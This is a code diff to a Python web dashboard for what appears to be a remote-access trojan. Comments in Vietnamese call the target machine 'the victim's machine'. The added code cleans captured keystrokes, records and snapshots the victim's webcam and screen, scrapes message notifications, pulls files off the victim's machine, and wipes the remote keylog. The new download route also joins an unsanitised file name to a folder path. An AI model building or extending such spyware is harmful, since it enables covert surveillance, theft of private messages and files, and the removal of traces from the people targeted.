@@ -17,11 +17,52 @@ import sqlite3
 import re
 import cv2
 
+
+def clean_keylog_text(raw_text):
+    if not raw_text: return ""
+    
+    # 1. Xóa phím Backspace để giữ nội dung thô dễ đọc
+    tags_to_remove = ["[<-]", "[Back]", "[BACK]", "\b"] 
+    clean_text = raw_text
+    for tag in tags_to_remove:
+        clean_text = clean_text.replace(tag, "")
+        
+    # 2. Đổi tên phím kỹ thuật sang tên thân thiện
+    replacements = {
+        "[LShift]": "[Shift]",   "[RShift]": "[Shift]",
+        "[LControl]": "[Ctrl]",  "[RControl]": "[Ctrl]",
+        "[LAlt]": "[Alt]",       "[RAlt]": "[Alt]",
+        "[Return]": "\n",        "[Enter]": "\n",
+        "Capital": "[CapsLock]", "[Capital]": "[CapsLock]", # Sửa lỗi Capital
+        "[OemComma]": ",",       "[OemPeriod]": ".",        # Sửa thêm mấy phím dấu
+        "[Space]": " "
+    }
+    
+    for old, new in replacements.items():
+        clean_text = clean_text.replace(old, new)
+
+    # 3. GỘP CÁC PHÍM CHỨC NĂNG LẶP LẠI (QUAN TRỌNG)
+    # Ví dụ: [Shift][Shift][Shift] -> [Shift]
+    # Regex tìm: (một cụm trong ngoặc vuông) lặp lại 1 lần trở lên
+    clean_text = re.sub(r'(\[[a-zA-Z0-9]+\])\1+', r'\1', clean_text)
+
+    return clean_text
+
+
 # ---------------- CONFIG ----------------
 HTTP_PORT = 8000
 WS_PORT = 8888
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))  # client/
 DLL_PATH = os.path.join(BASE_DIR, "client.dll")
+DOWNLOAD_DIR = os.path.join(BASE_DIR, "downloads")
+PICTURE_DIR = os.path.join(BASE_DIR, "images")
+if not os.path.exists(PICTURE_DIR):
+    os.makedirs(PICTURE_DIR)
+
+if not os.path.exists(DOWNLOAD_DIR):
+    os.makedirs(DOWNLOAD_DIR)
+
+
 WEBCAM_JPG = os.path.join(BASE_DIR, "webcam.jpg")
 APPS_TXT = os.path.join(BASE_DIR, "apps.txt")
 EXPLORER_TXT = os.path.join(BASE_DIR, "explorer.txt")
@@ -30,6 +71,7 @@ KEYLOG_TXT = os.path.join(BASE_DIR, "keylog.txt")
 HISTORY_DB = os.path.join(BASE_DIR, "history.db")
 SCREENSHOT_BMP = os.path.join(BASE_DIR, "screenshot.bmp")
 SCREEN_JPG = os.path.join(BASE_DIR, "screen.jpg")
+
 camera = cv2.VideoCapture(0)
 
 # ---------------- GLOBALS ----------------
@@ -42,7 +84,7 @@ _stream_thread = None    # handle cho thread stream (nếu cần kiểm tra is_a
 webcam_writer = None
 is_recording_webcam = False
 webcam_record_thread = None
-
+is_recording_screen = False
 
 # ---------------- MODE MANAGER (chèn vào webapp.py, top-level) ----------------
 # modes: keys and human names
@@ -85,6 +127,7 @@ if lib:
         lib.GetProcessList.restype   = ctypes.c_char_p # (Nếu có dùng)
         lib.GetInstalledApps.restype = ctypes.c_char_p
         lib.GetDrives.restype        = ctypes.c_char_p
+        lib.GetSystemStats.restype   = ctypes.c_char_p
         lib.ExplorePath.argtypes     = [ctypes.c_char_p]
         lib.ExplorePath.restype      = ctypes.c_char_p
 
@@ -112,6 +155,7 @@ if lib:
         # 5. Keylog & Notify
         lib.HookKeylog.restype   = None
         lib.UnhookKeylog.restype = None
+        lib.ClearKeylogRemote.restype = None
         lib.GetKeylog.restype    = None # Vẫn ghi file
         lib.GetNotificationHistory.restype = None # Vẫn ghi file DB
 
@@ -376,62 +420,151 @@ def _webcam_wrapper():
         webcam_running = False
         _stream_thread = None
 
-def record_webcam_task(filename):
+def record_webcam_task(filename, duration=0):
     global is_recording_webcam
-    print(f"[REC] Bắt đầu ghi video vào: {filename}")
+    print(f"[REC] Webcam start: {filename} (Duration: {duration}s)")
     
     writer = None
-    last_mtime = 0
+    FPS = 10.0 # Tốc độ khung hình cố định
     
-    # Chờ file ảnh xuất hiện
-    while not os.path.exists(WEBCAM_JPG) and is_recording_webcam:
-        time.sleep(0.1)
-
-    try:
-        # Đọc frame đầu tiên để lấy kích thước
-        first_frame = cv2.imread(WEBCAM_JPG)
-        if first_frame is not None:
-            h, w, _ = first_frame.shape
-            # Tạo VideoWriter (FPS 10)
-            writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), 10.0, (w, h))
-    except Exception as e:
-        print("[REC] Init error:", e)
-        return
+    # 1. Khởi tạo (Retry 5 lần)
+    for i in range(10):
+        if not is_recording_webcam: return
+        if os.path.exists(WEBCAM_JPG):
+            try:
+                first = cv2.imread(WEBCAM_JPG)
+                if first is not None:
+                    h, w, _ = first.shape
+                    writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), FPS, (w, h))
+                    break
+            except: pass
+        time.sleep(0.2)
 
     if not writer:
-        print("[REC] Không thể khởi tạo VideoWriter.")
+        print("[REC] Không thể khởi tạo Webcam Writer.")
+        is_recording_webcam = False
         return
 
+    start_time = time.time()
+    frames_written = 0 # Đếm số frame đã ghi được
+    last_frame = None
+
     while is_recording_webcam:
+        # Tính thời gian thực đã trôi qua
+        elapsed = time.time() - start_time
+        
+        # Kiểm tra dừng
+        if duration > 0 and elapsed > duration:
+            is_recording_webcam = False
+            break
+
+        # 2. Đọc ảnh mới nhất (nếu có)
+        current_frame = None
         try:
             if os.path.exists(WEBCAM_JPG):
-                # Kiểm tra xem file ảnh có mới không (dựa vào thời gian sửa đổi)
-                mtime = os.path.getmtime(WEBCAM_JPG)
-                if mtime > last_mtime:
-                    # Đọc file ảnh an toàn
-                    # (Copy ra temp để tránh xung đột khi DLL đang ghi)
-                    temp_img = WEBCAM_JPG + ".tmp_rec"
-                    shutil.copy2(WEBCAM_JPG, temp_img)
-                    
-                    frame = cv2.imread(temp_img)
-                    if frame is not None:
-                        writer.write(frame)
-                        last_mtime = mtime
-                    
-                    # Xóa file temp nhẹ
-                    try: os.remove(temp_img)
-                    except: pass
-            
-            time.sleep(0.05) # Check mỗi 50ms
-        except Exception as e:
-            print("[REC] Frame error:", e)
+                temp = WEBCAM_JPG + ".tmp_rec"
+                try:
+                    shutil.copy2(WEBCAM_JPG, temp)
+                    current_frame = cv2.imread(temp)
+                    os.remove(temp)
+                except: pass
+        except: pass
+
+        # Cập nhật frame backup
+        if current_frame is not None:
+            last_frame = current_frame
+        
+        # Nếu không đọc được ảnh mới thì dùng ảnh cũ
+        target_frame = current_frame if current_frame is not None else last_frame
+
+        if target_frame is None:
             time.sleep(0.1)
+            continue
 
-    if writer:
-        writer.release()
-    print(f"[REC] Đã lưu video: {filename}")
+        # 3. THUẬT TOÁN BÙ FRAME (QUAN TRỌNG NHẤT)
+        # Tính xem lẽ ra tại thời điểm này video phải có bao nhiêu frame
+        expected_frames = int(elapsed * FPS)
+        
+        # Nếu số frame đã ghi ít hơn số frame cần thiết -> Ghi bù vào liên tục
+        while frames_written < expected_frames:
+            writer.write(target_frame)
+            frames_written += 1
+        
+        # Ngủ rất ít để vòng lặp quay lại kiểm tra nhanh
+        time.sleep(0.01)
+
+    if writer: writer.release()
+    print(f"[REC] Đã lưu video: {filename} (Total frames: {frames_written})")
     
+    
+def record_screen_task(filename, duration=0):
+    global is_recording_screen
+    print(f"[REC] Screen start: {filename} (Duration: {duration}s)")
+    
+    writer = None
+    FPS = 10.0
+    
+    for i in range(10):
+        if not is_recording_screen: return
+        if os.path.exists(SCREEN_JPG):
+            try:
+                first = cv2.imread(SCREEN_JPG)
+                if first is not None:
+                    h, w, _ = first.shape
+                    writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'MJPG'), FPS, (w, h))
+                    break
+            except: pass
+        time.sleep(0.2)
 
+    if not writer:
+        print("[REC] Không thể khởi tạo Screen Writer.")
+        is_recording_screen = False
+        return
+
+    start_time = time.time()
+    frames_written = 0
+    last_frame = None
+
+    while is_recording_screen:
+        elapsed = time.time() - start_time
+        
+        if duration > 0 and elapsed > duration:
+            is_recording_screen = False
+            break
+
+        current_frame = None
+        try:
+            if os.path.exists(SCREEN_JPG):
+                temp = SCREEN_JPG + ".tmp_rec"
+                try:
+                    shutil.copy2(SCREEN_JPG, temp)
+                    current_frame = cv2.imread(temp)
+                    os.remove(temp)
+                except: pass
+        except: pass
+
+        if current_frame is not None:
+            last_frame = current_frame
+        
+        target_frame = current_frame if current_frame is not None else last_frame
+
+        if target_frame is None:
+            time.sleep(0.1)
+            continue
+
+        # LOGIC BÙ FRAME
+        expected_frames = int(elapsed * FPS)
+        
+        while frames_written < expected_frames:
+            writer.write(target_frame)
+            frames_written += 1
+        
+        time.sleep(0.01)
+
+    if writer: writer.release()
+    print(f"[REC] Đã lưu video màn hình: {filename} (Total frames: {frames_written})")
+    
+    
 def start_mode(mode: str) -> bool:
     """
     Start a mode safely:
@@ -524,7 +657,7 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     # --- Thay thế toàn bộ method do_GET bằng đoạn này ---
     def do_GET(self):
-        global webcam_running
+        global webcam_running, is_recording_webcam, is_recording_screen
         
         if self.path == '/':
             # Chỉ định file cần mở là index.html trong thư mục templates
@@ -555,8 +688,8 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
                         lines = data_str.split('\n')
                         for line in lines:
                             p = line.strip().split('|')
-                            if len(p) >= 3:
-                                apps.append({"id": p[0], "name": p[1], "threads": p[2]})
+                            if len(p) >= 4: # [MỚI] Ít nhất 4 trường
+                                apps.append({"id": p[0], "name": p[1], "threads": p[2], "memory": p[3]})
                 except Exception as e:
                     print("[HTTP] GetAppList error:", e)
 
@@ -567,18 +700,72 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
 
         
+        elif self.path == '/api/stats':
+            res = "0|0|0|0|0"
+            if lib:
+                try:
+                    with lib_lock:
+                        ptr = lib.GetSystemStats()
+                    if ptr:
+                        res = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
+                except: pass
+            
+            # Tách chuỗi: CPU | RAM_U | RAM_T | DISK_U | DISK_T
+            parts = res.split('|')
+            data = {
+                "cpu": 0, 
+                "ram_u": 0, "ram_t": 0, "ram_p": 0,
+                "disk_u": 0, "disk_t": 0, "disk_p": 0
+            }
+            
+            if len(parts) >= 5:
+                try:
+                    cpu = int(float(parts[0].replace(',', '.'))) # int(float(...)) an toàn hơn
+                    
+                    ram_u = float(parts[1].replace(',', '.'))
+                    ram_t = float(parts[2].replace(',', '.'))
+                    
+                    ram_p = int((ram_u / ram_t * 100)) if ram_t > 0 else 0
+                    
+                    disk_u = int(float(parts[3].replace(',', '.')))
+                    disk_t = int(float(parts[4].replace(',', '.')))
+                    disk_p = int((disk_u / disk_t * 100)) if disk_t > 0 else 0
+
+                    data = {
+                        "cpu": cpu,
+                        "ram_u": ram_u, "ram_t": ram_t, "ram_p": ram_p,
+                        "disk_u": disk_u, "disk_t": disk_t, "disk_p": disk_p
+                    }
+                except: pass
+
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps(data).encode())
+            return
+        
         elif self.path == '/api/keylog/text':
             text = ""
             if lib:
                 try:
                     with lib_lock:
-                        if os.path.exists(KEYLOG_TXT):
-                            os.remove(KEYLOG_TXT)
-                        lib.GetKeylog()
+                        lib.GetKeylog() # Gọi lệnh lấy dữ liệu mới
+                    
+                    # Đợi file và kiểm tra tồn tại
                     ok = wait_for_file(KEYLOG_TXT, timeout=2.0)
                     if ok and os.path.exists(KEYLOG_TXT):
-                        with open(KEYLOG_TXT, "r", errors="ignore") as f:
-                            text = f.read()
+                        # [QUAN TRỌNG] Thêm encoding='utf-8' để đọc đúng tiếng Việt
+                        with open(KEYLOG_TXT, "r", encoding="utf-8", errors="replace") as f:
+                            raw_data = f.read()
+                            
+                            # Debug: In ra độ dài dữ liệu thô để kiểm tra
+                            print(f"[DEBUG] Raw Keylog size: {len(raw_data)} chars")
+                            
+                            # Làm sạch văn bản
+                            text = clean_keylog_text(raw_data)
+                    else:
+                        print("[DEBUG] Keylog file not found or empty.")
+                            
                 except Exception as e:
                     print("[HTTP] GetKeylog error:", e)
 
@@ -587,6 +774,7 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"text": text}).encode())
             return
+        
         
         elif self.path == '/api/notify/list':
             data_list = []
@@ -611,9 +799,18 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
 
                                 content_text = ""
                                 try:
-                                    matches = re.findall(r'>\s*([^<>]{2,120})\s*<', xml_str)
-                                    clean_texts = [m.strip() for m in matches if m.strip()]
+                                    # 1. Ưu tiên tìm thẻ <text> (Chuẩn của Windows Toast)
+                                    matches = re.findall(r'<text[^>]*>(.*?)</text>', xml_str)
+                                    
+                                    # 2. Nếu không thấy thẻ text, mới tìm kiểu chung chung
+                                    if not matches:
+                                        matches = re.findall(r'>([^<]{2,200})<', xml_str)
+
+                                    # Lọc bỏ các ký tự rác hoặc xuống dòng thừa
+                                    clean_texts = [m.strip() for m in matches if m.strip() and "{" not in m] 
+                                    
                                     if clean_texts:
+                                        # Zalo/Fb thường dòng 1 là Tên người gửi, dòng 2 là Nội dung
                                         content_text = " | ".join(clean_texts)
                                 except:
                                     pass
@@ -677,6 +874,27 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps(entries).encode())
             return
         
+        # --- [MỚI] CHO PHÉP TRÌNH DUYỆT TẢI FILE VỀ ---
+        elif self.path.startswith('/download/'):
+            # Lấy tên file từ URL
+            fname = self.path.replace('/download/', '')
+            # Decode URL (ví dụ %20 thành khoảng trắng)
+            import urllib.parse
+            fname = urllib.parse.unquote(fname)
+            
+            fpath = os.path.join(DOWNLOAD_DIR, fname)
+            
+            if os.path.exists(fpath):
+                with open(fpath, 'rb') as f:
+                    data = f.read()
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/octet-stream')
+                self.send_header('Content-Disposition', f'attachment; filename="{fname}"')
+                self.end_headers()
+                self.wfile.write(data)
+            else:
+                self.send_error(404, "File not found in download folder")
+            return
         
         elif self.path == '/api/apps/installed':
             apps = []
@@ -758,26 +976,205 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
 
             try:
                 while True:
-                    if os.path.exists(SCREEN_JPG):
-                        with open(SCREEN_JPG, 'rb') as f:
-                            frame = f.read()
-
-                        self.wfile.write(b"--frame\r\n")
-                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n")
-                        self.wfile.write(frame)
-                        self.wfile.write(b"\r\n")
-
-                    time.sleep(0.05)
+                    # [SỬA] Bọc try-except để không bị crash khi C++ đang xóa file
+                    try:
+                        if os.path.exists(SCREEN_JPG):
+                            with open(SCREEN_JPG, 'rb') as f: 
+                                frame = f.read()
+                            
+                            if frame: 
+                                self.wfile.write(b"--frame\r\n")
+                                self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n")
+                                self.wfile.write(frame)
+                                self.wfile.write(b"\r\n")
+                        else:
+                            time.sleep(0.05)
+                            
+                    except (FileNotFoundError, PermissionError, OSError):
+                        # Lỗi đọc file -> Bỏ qua frame này, chờ frame sau
+                        time.sleep(0.02)
+                        continue
+                    
+                    time.sleep(0.05) 
             except (ConnectionResetError, BrokenPipeError, ValueError):
                 pass
             return
+        
+        # --- [MỚI] API START RECORD SCREEN ---
+        elif self.path == '/api/screen/record/start':
+            if not is_recording_screen:
+                is_recording_screen = True
+                t_str = time.strftime("%Y%m%d_%H%M%S")
+                filename = os.path.join(BASE_DIR, f"screen_{t_str}.avi")
+                
+                t = threading.Thread(target=record_screen_task, args=(filename,))
+                t.daemon = True
+                t.start()
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"STARTED")
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"ALREADY_RUNNING")
+            return
+
+        # --- [MỚI] API STOP RECORD SCREEN ---
+        elif self.path == '/api/screen/record/stop':
+            if is_recording_screen:
+                is_recording_screen = False
+                time.sleep(0.5)
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"STOPPED")
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"NOT_RUNNING")
+            return
+        
+        
+        # --- [FIXED] API CHỤP ẢNH WEBCAM ---
+        elif self.path == '/api/screen/snapshot':
+            # Thử 5 lần, mỗi lần cách nhau 0.1s để tránh lúc C++ đang xóa file
+            saved_ok = False
+            fname = ""
+            
+            for i in range(5):
+                if os.path.exists(SCREEN_JPG):
+                    try:
+                        ts = time.strftime("%Y%m%d_%H%M%S")
+                        fname = f"screen_{ts}.jpg"
+                        save_path = os.path.join(PICTURE_DIR, fname)
+                        
+                        # Copy file an toàn
+                        shutil.copy2(SCREEN_JPG, save_path)
+                        print(f"[SNAP] Saved: {save_path}")
+                        saved_ok = True
+                        break # Thành công thì thoát vòng lặp
+                    except: 
+                        pass # Lỗi thì thử lại
+                time.sleep(0.1)
+
+            if saved_ok:
+                # Mở file vừa lưu để gửi về
+                save_path = os.path.join(PICTURE_DIR, fname)
+                with open(save_path, "rb") as f:
+                    data = f.read()
+                
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
+                self.end_headers()
+                self.wfile.write(data)
+            else:
+                self.send_error(404, "Screen busy or not ready")
+            return
+        
+        # --- [FIXED] API START RECORD WEBCAM ---
+        elif self.path == '/api/webcam/record/start':
+            # KHÔNG CẦN KHAI BÁO GLOBAL Ở ĐÂY NỮA (ĐÃ CÓ Ở ĐẦU HÀM)
+            if not is_recording_webcam:
+                is_recording_webcam = True
+                # Tạo tên file
+                t_str = time.strftime("%Y%m%d_%H%M%S")
+                filename = os.path.join(BASE_DIR, f"webcam_{t_str}.avi")
+                
+                # Chạy thread ghi hình
+                t = threading.Thread(target=record_webcam_task, args=(filename,))
+                t.daemon = True
+                t.start()
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"STARTED")
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"ALREADY_RUNNING")
+            return
+
+        # --- [FIXED] API STOP RECORD WEBCAM ---
+        elif self.path == '/api/webcam/record/stop':
+            # KHÔNG CẦN KHAI BÁO GLOBAL Ở ĐÂY NỮA
+            if is_recording_webcam:
+                is_recording_webcam = False
+                time.sleep(0.5) # Chờ luồng ghi đóng file
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"STOPPED")
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"NOT_RUNNING")
+            return
+        
+        elif self.path == '/api/webcam/snapshot':
+            saved_ok = False
+            fname = ""
+            
+            # Thử 5 lần liên tiếp để tránh xung đột file
+            for i in range(5):
+                if os.path.exists(WEBCAM_JPG):
+                    try:
+                        ts = time.strftime("%Y%m%d_%H%M%S")
+                        fname = f"webcam_{ts}.jpg"
+                        save_path = os.path.join(PICTURE_DIR, fname)
+                        
+                        shutil.copy2(WEBCAM_JPG, save_path)
+                        print(f"[SNAP] Saved: {save_path}")
+                        saved_ok = True
+                        break 
+                    except: 
+                        pass 
+                time.sleep(0.1)
+
+            if saved_ok:
+                # Mở file vừa lưu để gửi về client
+                save_path = os.path.join(PICTURE_DIR, fname)
+                with open(save_path, "rb") as f:
+                    data = f.read()
+                
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
+                self.end_headers()
+                self.wfile.write(data)
+            else:
+                self.send_error(404, "Webcam busy or not ready")
+            return
+        
+        elif self.path == '/api/screen/snapshot':
+            if os.path.exists(SCREEN_JPG):
+                ts = time.strftime("%Y%m%d_%H%M%S")
+                fname = f"screen_{ts}.jpg"
+                save_path = os.path.join(PICTURE_DIR, fname)
+                
+                try:
+                    shutil.copy2(SCREEN_JPG, save_path)
+                    print(f"[SNAP] Saved: {save_path}")
+                except: pass
+
+                with open(SCREEN_JPG, "rb") as f:
+                    data = f.read()
+                
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
+                self.end_headers()
+                self.wfile.write(data)
+            else:
+                self.send_error(404, "Screen not ready")
+            return
+        
 
         # mặc định: phục vụ file tĩnh / index
         return http.server.SimpleHTTPRequestHandler.do_GET(self)
 
     def do_POST(self):
         global webcam_running
-        global is_recording_webcam
+        global is_recording_webcam, is_recording_screen
         print("[HTTP] POST", self.path)
 
         # ---- Start webcam
@@ -846,6 +1243,57 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps(entries).encode())
             return
         
+        # --- [MỚI] API DOWNLOAD FILE TỪ MÁY NẠN NHÂN ---
+        elif self.path == '/api/files/download':
+            length = int(self.headers.get('Content-Length', 0))
+            data = self.rfile.read(length) if length > 0 else b''
+            try:
+                payload = json.loads(data.decode('utf-8'))
+                remote_path = payload.get('path', '')
+            except: remote_path = ''
+
+            if not remote_path or not lib:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": False, "error": "Bad Request"}).encode())
+                return
+
+            # 1. Lấy tên file
+            filename = os.path.basename(remote_path)
+            # 2. Đường dẫn lưu trên Server (Folder download)
+            local_save_path = os.path.join(DOWNLOAD_DIR, filename)
+
+            # Xóa file cũ nếu trùng
+            if os.path.exists(local_save_path):
+                try: os.remove(local_save_path)
+                except: pass
+
+            print(f"[DOWN] Downloading: {remote_path} -> {local_save_path}")
+
+            try:
+                with lib_lock:
+                    # Gọi DLL để tải file
+                    lib.DownloadFile(remote_path.encode('utf-8'), local_save_path.encode('utf-8'))
+                
+                # Kiểm tra xem file đã về chưa
+                if os.path.exists(local_save_path) and os.path.getsize(local_save_path) > 0:
+                    self.send_response(200)
+                    self.send_header('Content-type', 'application/json')
+                    self.end_headers()
+                    # Trả về tên file để JS tạo link tải
+                    self.wfile.write(json.dumps({"ok": True, "file": filename}).encode())
+                else:
+                    self.send_response(500)
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"ok": False, "error": "Download failed or empty file"}).encode())
+
+            except Exception as e:
+                print("[DOWN] Error:", e)
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode())
+            return
+        
         
         elif self.path == '/api/keylog/hook':
             ok = False
@@ -877,6 +1325,27 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({"ok": ok}).encode())
             return
         
+        elif self.path == '/api/keylog/clear':
+            try:
+                # 1. Xóa file trên máy Python (Local)
+                with open(KEYLOG_TXT, "w") as f:
+                    f.write("") 
+
+                # 2. [MỚI] Gửi lệnh xóa file gốc trên máy Nạn nhân (Remote)
+                if lib:
+                    with lib_lock:
+                        lib.ClearKeylogRemote()
+
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": True}).encode())
+            except Exception as e:
+                print("[API] Clear error:", e)
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": False}).encode())
+            return
         
         # Mode control (Web dashboard)
         elif self.path in ('/api/set_mode', '/api/mode'):
@@ -1042,24 +1511,31 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         
         elif self.path == '/api/webcam/record/start':
-            
+            length = int(self.headers.get('Content-Length', 0))
+            data = self.rfile.read(length) if length > 0 else b''
+            duration = 0
+            try:
+                payload = json.loads(data.decode('utf-8'))
+                duration = int(payload.get('duration', 0))
+            except: pass
+
             if not is_recording_webcam:
                 is_recording_webcam = True
-                # Tạo tên file: webcam_năm-tháng-ngày_giờ-phút-giây.avi
                 t_str = time.strftime("%Y%m%d_%H%M%S")
                 filename = os.path.join(BASE_DIR, f"webcam_{t_str}.avi")
                 
-                t = threading.Thread(target=record_webcam_task, args=(filename,))
+                # Truyền duration vào thread
+                t = threading.Thread(target=record_webcam_task, args=(filename, duration))
                 t.daemon = True
                 t.start()
                 
                 self.send_response(200)
                 self.end_headers()
-                self.wfile.write(b"STARTED")
+                self.wfile.write(json.dumps({"ok": True}).encode())
             else:
-                self.send_response(200)
+                self.send_response(200) # Đang chạy rồi thì thôi
                 self.end_headers()
-                self.wfile.write(b"ALREADY_RUNNING")
+                self.wfile.write(json.dumps({"ok": False, "msg": "Running"}).encode())
             return
 
         # --- [MỚI] API STOP RECORD WEBCAM ---
@@ -1111,6 +1587,32 @@ class IoTRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({"ok": ok}).encode())
             return
         
+        elif self.path == '/api/screen/record/start':
+            length = int(self.headers.get('Content-Length', 0))
+            data = self.rfile.read(length) if length > 0 else b''
+            duration = 0
+            try:
+                payload = json.loads(data.decode('utf-8'))
+                duration = int(payload.get('duration', 0))
+            except: pass
+
+            if not is_recording_screen:
+                is_recording_screen = True
+                t_str = time.strftime("%Y%m%d_%H%M%S")
+                filename = os.path.join(BASE_DIR, f"screen_{t_str}.avi")
+                
+                t = threading.Thread(target=record_screen_task, args=(filename, duration))
+                t.daemon = True
+                t.start()
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": True}).encode())
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(json.dumps({"ok": False, "msg": "Running"}).encode())
+            return
         
         else:
             self.send_error(404)
